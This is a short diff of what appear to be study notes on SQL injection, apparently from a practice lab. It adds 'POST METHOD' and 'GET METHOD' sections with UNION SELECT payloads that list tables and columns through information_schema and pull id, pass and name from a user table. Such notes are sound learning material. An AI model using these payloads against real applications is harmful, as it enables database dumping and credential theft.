@@ -171,6 +171,8 @@ table_name = list of table names
 
 column_names = list of column names
 
+POST METHOD:
+
 Audi' UNION SELECT 1,2,3,4,5;#
 Audi' UNION SELECT 1,2,3,table_schema,table_name from information_schema.tables; # (dumps all tables and their names)
 
@@ -200,12 +202,13 @@ Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #
 
     Change the column name to a different spot, in order to see how you can manipulate the output from the SQL query.
 
+GET METHOD:
 
+php?Selection=2 UNION SELECT table_schema,table_name,3 FROM information_schema.tables;
 
+php?Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.tables;
 
-
-
-
+php?Selection=2 UNION SELECT id,pass,name from session.user;
 
 
 
